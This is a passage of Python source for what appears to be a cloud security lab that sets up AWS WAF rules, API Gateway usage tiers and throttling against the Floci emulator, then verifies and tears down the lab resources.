            WebAclArn=acl['WebACL']['ARN'], RuleMetricName='rateLimit', Scope=SCOPE, MaxItems=10,
            TimeWindow={'StartTime': time.time() - 600, 'EndTime': time.time()})
        sampled = {'Outcome': 'answered'}
    except (ClientError, BotoCoreError) as exc:
        sampled = {'Outcome': 'unsupported', 'Code': _code(exc) if isinstance(exc, ClientError) else type(exc).__name__}
    response = {'Evaluation': rows, 'Floci': floci, 'GetSampledRequests': sampled}
    wrong = [row['Request'] for row in rows if row['Outcome'] != row['Expected']]
    if wrong:
        return _result('waf-evaluation', EVALUATE_COMMAND, response, False,
                       f'Unexpected outcomes for {", ".join(wrong)}.', started)
    message = ('The partner call is allowed; the bad address, the blocked country, the cross-site scripting attempt '
               'and the Log4j probe are each blocked by their own rule; the scraper gets 100 requests through, then '
               '50 blocked with 429.')
    if floci.get('BlockedAddressStatus') == 200 or sampled['Outcome'] != 'answered':
        message += ' Floci does not run WAF rules'
        if floci.get('BlockedAddressStatus') == 200:
            message += ' (a call from a blocked address got 200)'
        message += ', so the step evaluated the requests itself.'
    _marker('waf-evaluation', {'message': message})
    verified, check = _check_evaluation()
    return _result('waf-evaluation', EVALUATE_COMMAND, response, verified, check, started)


def step_usage_tiers() -> dict[str, Any]:
    started = time.perf_counter()
    gateway = _client('apigateway')
    api = _api()
    if not api or not _stage(api['id']):
        return _result('usage-tiers', PLANS_COMMAND, {}, False, f'Deploy {API} first.', started)
    plans, keys = _plans(), _keys()
    sent = {}
    for name, spec in PLANS.items():
        plan = plans.get(name)
        if not plan:
            plan = gateway.create_usage_plan(name=name, apiStages=[{'apiId': api['id'], 'stage': STAGE}],
                                             throttle=spec['throttle'], quota=spec['quota'], tags={'Lab': LAB_KEY})
        sent[name] = {'throttle': spec['throttle'], 'quota': spec['quota']}
        key = keys.get(spec['key'])
        if not key:
            key = gateway.create_api_key(name=spec['key'], enabled=True, tags={'Lab': LAB_KEY})
        if spec['key'] not in _plan_key_names(plan['id']):
            gateway.create_usage_plan_key(usagePlanId=plan['id'], keyId=key['id'], keyType='API_KEY')
    if UNPLANNED_KEY not in keys:
        gateway.create_api_key(name=UNPLANNED_KEY, enabled=True, tags={'Lab': LAB_KEY})
    _marker('usage-tiers', {'SentPlans': sent})
    keys = _keys()
    calls = {'NoKey': _call(api['id']),
             'Bronze': _call(api['id'], {'x-api-key': keys[PLANS['lab-edge-bronze']['key']]['value']}),
             'Gold': _call(api['id'], {'x-api-key': keys[PLANS['lab-edge-gold']['key']]['value']}),
             'Unplanned': _call(api['id'], {'x-api-key': keys[UNPLANNED_KEY]['value']})}
    read_back = {name: {key: plan.get(key) for key in ('throttle', 'quota', 'apiStages')}
                 for name, plan in _plans().items()}
    response = {'Calls': calls, 'PlansAsSent': sent, 'PlansAsReadBack': read_back}
    verified, message = _check_tiers()
    expected_calls = {'NoKey': 403, 'Bronze': 200, 'Gold': 200, 'Unplanned': 403}
    if verified and calls != expected_calls:
        verified, message = False, f'Expected {expected_calls}, got {calls}.'
    elif verified:
        message += ' Both partner keys get 200; no key and a key in no plan get 403.'
        if not any(plan.get('throttle') for plan in read_back.values()):
            message += ' Floci reads the plans back without throttle or quota, so the step kept what it sent.'
    return _result('usage-tiers', PLANS_COMMAND, response, verified, message, started)


def step_throttling() -> dict[str, Any]:
    started = time.perf_counter()
    rows = {name: {**token_bucket(spec['throttle']['rateLimit'], spec['throttle']['burstLimit'], BURST_ARRIVALS),
                   'Throttle': spec['throttle']} for name, spec in PLANS.items()}
    bronze, gold = rows['lab-edge-bronze'], rows['lab-edge-gold']
    layers = [{'Need': need, 'Layer': layer} for need, layer in LAYERS]
    response = {'Requests': len(BURST_ARRIVALS), 'Plans': rows, 'BronzeDaysOfQuotaAt50PerDay': 1000 // 50,
                'Layers': layers}
    message = (f'Of {len(BURST_ARRIVALS)} requests (40 at once, then 10 a second for 3 s), bronze lets '
               f'{bronze["Allowed"]} through and answers {bronze["Throttled429"]} with 429; gold lets all '
               f'{gold["Allowed"]} through. A bronze partner calling 50 times a day uses its monthly quota in 20 '
               'days. WAF stops bad requests before they count; usage plans share capacity fairly among good ones.')
    _marker('throttling', {'message': message})
    verified, check = _check_throttling()
    return _result('throttling', THROTTLE_COMMAND, response, verified, check, started)


RUNNERS = {
    'quotes-api': step_quotes_api,
    'usage-tiers': step_usage_tiers,
    'ip-set': step_ip_set,
    'web-acl': step_web_acl,
    'associate': step_associate,
    'waf-evaluation': step_waf_evaluation,
    'throttling': step_throttling,
}
CHECKS = {
    'quotes-api': _check_api,
    'usage-tiers': _check_tiers,
    'ip-set': _check_ip_set,
    'web-acl': _check_acl,
    'associate': _check_associate,
    'waf-evaluation': _check_evaluation,
    'throttling': _check_throttling,
}


def run_step(service_key: str, lab_key: str, step_key: str) -> dict[str, Any]:
    if service_key != SERVICE or lab_key != LAB_KEY:
        raise ValueError('Lab not found')
    runner = RUNNERS.get(step_key)
    if not runner:
        raise ValueError(f'Unknown step {step_key} for lab {LAB_KEY}')
    return runner()


# ── Status and reset ─────────────────────────────────────────────────────────

def _safe(check) -> bool:
    try:
        return bool(check()[0])
    except (ClientError, BotoCoreError, KeyError):
        return False


def status(service_key: str = SERVICE, lab_key: str = LAB_KEY) -> dict[str, Any]:
    steps = {}
    for step in STEP_KEYS:
        verified = _safe(CHECKS[step])
        steps[step] = {
            'verified': verified,
            'verification': {'status': 'passed', 'message': 'Verified against Floci.'} if verified else None,
        }
    passed = sum(1 for item in steps.values() if item['verified'])
    complete = passed == len(steps)
    return {
        'service': SERVICE,
        'lab': LAB_KEY,
        'complete': complete,
        'status': 'passed' if complete else ('in_progress' if passed else 'not_started'),
        'steps': steps,
        'passed_steps': passed,
        'total_steps': len(steps),
    }


def reset(service_key: str = SERVICE, lab_key: str = LAB_KEY) -> dict[str, Any]:
    """Delete the usage plans and keys, the ACL association, logging and web ACLs, the IP set, the log group and the
    API."""
    started = time.perf_counter()
    deleted: list[str] = []
    errors: list[str] = []

    def attempt(label: str, call) -> None:
        try:
            call()
            deleted.append(label)
        except ClientError as exc:
            code = _code(exc)
            if 'NotFound' in code or 'Nonexistent' in code or code.startswith('NoSuch'):
                return
            errors.append(f'{label}: {exc}')
        except BotoCoreError as exc:
            errors.append(f'{label}: {exc}')

    gateway, waf, logs = _client('apigateway'), _client('wafv2'), _client('logs')
    try:
        plans, keys, api = _plans(), _keys(), _api()
    except (ClientError, BotoCoreError) as exc:
        plans, keys, api = {}, {}, None
        errors.append(f'api lookup: {exc}')
    for name, plan in plans.items():
        for item in gateway.get_usage_plan_keys(usagePlanId=plan['id'], limit=500).get('items', []):
            attempt(f'usage-plan-key:{item.get("name")}', lambda item=item, plan=plan: gateway.delete_usage_plan_key(
                usagePlanId=plan['id'], keyId=item['id']))
        attempt(f'usage-plan:{name}', lambda plan=plan: gateway.delete_usage_plan(usagePlanId=plan['id']))
    for name, key in keys.items():
        attempt(f'api-key:{name}', lambda key=key: gateway.delete_api_key(apiKey=key['id']))
    if api:
        attempt('waf-association', lambda: waf.disassociate_web_acl(ResourceArn=_stage_arn(api['id'])))
    for name in (ACL, DUP_ACL):
        try:
            acl = _acl(name)
        except (ClientError, BotoCoreError) as exc:
            acl = None
            errors.append(f'acl lookup {name}: {exc}')
        if not acl:
            continue
        attempt(f'waf-logging:{name}', lambda acl=acl: waf.delete_logging_configuration(
            ResourceArn=acl['WebACL']['ARN']))
        acl = _acl(name) or acl
        attempt(f'web-acl:{name}', lambda acl=acl, name=name: waf.delete_web_acl(
            Name=name, Scope=SCOPE, Id=acl['WebACL']['Id'], LockToken=acl['LockToken']))
    try:
        ip_set = _ip_set()
    except (ClientError, BotoCoreError) as exc:
        ip_set = None
        errors.append(f'ip set lookup: {exc}')
    if ip_set:
        attempt(f'ip-set:{IP_SET}', lambda: waf.delete_ip_set(Name=IP_SET, Scope=SCOPE, Id=ip_set['IPSet']['Id'],
                                                              LockToken=ip_set['LockToken']))
    attempt(f'log-group:{LOG_GROUP}', lambda: logs.delete_log_group(logGroupName=LOG_GROUP))
    if api:
        attempt(f'rest-api:{API}', lambda: gateway.delete_rest_api(restApiId=api['id']))

    cache.delete_many([CACHE_PREFIX + step for step in STEP_KEYS])
    payload = {'status': 'reset', 'deleted_resources': deleted, 'errors': errors}
    return {
        'service': SERVICE,
        'lab': LAB_KEY,
        'command': (
            'aws apigateway delete-usage-plan-key ... && aws apigateway delete-usage-plan --usage-plan-id <id>   # both\n'
            'aws apigateway delete-api-key --api-key <id>   # each lab key\n'
            f'aws wafv2 disassociate-web-acl --resource-arn arn:aws:apigateway:{REGION}::/restapis/<api-id>/stages/{STAGE}\n'
            'aws wafv2 delete-logging-configuration --resource-arn <acl-arn>\n'
            f'aws wafv2 delete-web-acl --name {ACL} --scope {SCOPE} --id <id> --lock-token <token>\n'
            f'aws wafv2 delete-ip-set --name {IP_SET} --scope {SCOPE} --id <id> --lock-token <token>\n'
            f'aws logs delete-log-group --log-group-name {LOG_GROUP}\n'
            'aws apigateway delete-rest-api --rest-api-id <api-id>'
        ),
        'exit_code': 0,
        'stdout': json.dumps(payload, indent=2),
        'stderr': '',
        'json': payload,
        'duration_ms': round((time.perf_counter() - started) * 1000),
        'status': 'reset',
        'reset': True,
        'deleted_resources': deleted,
        'errors': errors,
        'verification': {
            'status': 'failed' if errors else 'passed',
            'message': 'Some lab resources could not be removed: ' + '; '.join(errors) if errors
            else 'The usage plans, keys, web ACL, IP set, log group and API are deleted.',
        },
    }
